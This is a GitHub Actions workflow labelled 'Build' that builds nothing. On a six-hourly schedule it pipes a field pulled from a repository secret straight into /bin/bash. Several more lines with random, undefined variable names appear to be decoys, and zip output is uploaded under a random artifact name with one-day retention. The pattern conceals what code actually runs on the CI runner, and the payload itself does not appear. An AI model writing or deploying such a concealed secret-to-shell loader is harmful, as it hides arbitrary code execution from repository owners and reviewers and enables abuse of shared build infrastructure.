name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '55 0,6,12,18 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          d3: ${{ secrets.d3 }}
        run: |
          printf '%s' "$d3" | jq -r .bkhk23 | /bin/bash
          echo $kiou502 | jq -r .j73620 | /bin/bash
          printf '%s' "$mgm0" | jq -r .ryq1056 | /bin/bash
          printf '%s' "$cy800" | jq -r .um60250 | /bin/bash
          echo $lhmr63 | jq -r .jrtfb8330 | /bin/bash
          printf '%s' "$ekwr65" | jq -r .bcao96802 | /bin/bash
          echo $tibti4525 | jq -r .x7818 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: PmWrPxoC
          path: "*.zip"
          retention-days: 1
